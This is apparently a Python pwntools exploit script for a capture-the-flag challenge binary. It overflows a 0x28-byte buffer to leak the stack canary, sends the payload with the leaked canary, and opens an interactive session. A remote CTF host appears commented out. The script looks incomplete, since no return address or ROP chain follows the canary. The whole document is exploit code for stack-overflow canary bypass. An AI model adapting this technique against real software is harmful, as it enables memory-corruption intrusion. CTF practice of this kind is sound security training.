from pwn import *
context.log_level='debug'
context.arch='amd64'
libc=ELF('/home/cc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
p=process('./pwn')
# p=remote('ctf.v50to.cc',10233)
# gdb.attach(p,'b *0x00000000004009FF')
# pause()

p.recvuntil(b'?\n')
payload=b'a'*0x28
p.sendline(payload)
# print(p.recv())
p.recvuntil(payload+b'\n')
canary=u64(b'\x00'+p.recv(7))
print('canary',hex(canary))
p.recvuntil(b'gift\n')
p.send(payload+p64(canary))
pause()
p.recvuntil(b'choice?\n')
p.send(b'a')

p.interactive()